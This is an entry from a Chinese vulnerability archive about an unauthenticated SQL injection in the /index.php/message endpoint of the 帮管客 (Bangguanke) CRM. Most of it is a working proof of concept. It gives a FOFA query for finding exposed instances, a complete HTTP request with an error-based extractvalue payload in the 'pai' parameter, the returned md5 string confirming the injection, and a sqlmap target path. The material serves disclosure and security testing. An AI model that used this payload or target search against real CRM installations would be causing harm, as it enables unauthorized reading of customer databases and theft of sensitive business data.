---

source: "wy876 漏洞文库"
---

# 帮管客CRM message存在SQL注入漏洞

# 一、漏洞简介
帮管客CRM是一款集客户档案、销售记录、业务往来等功能于一体的客户管理系统。帮管客CRM客户管理系统，客户管理，从未如此简单，一个平台满足企业全方位的销售跟进、智能化服务管理、高效的沟通协同、图表化帮管客CRM 客户管理系统/index.php/message 接口存在 sql 注入漏洞，未经身份认证的攻击者可通过此漏洞获取数据库敏感信息。

# 二、影响版本
+ 帮管客CRM

# 三、资产测绘
+ fofa`app="帮管客-CRM"`
+ 特征


# 四、漏洞复现
```plain
GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select+md5(1)),0x7e))%23&xu=desc HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```


```plain
c4ca4238a0b923820dcc509a6f75849
```

sqlmap

```plain
/index.php/message?page=1&pai=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mqhzq6w8dmpgikxd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
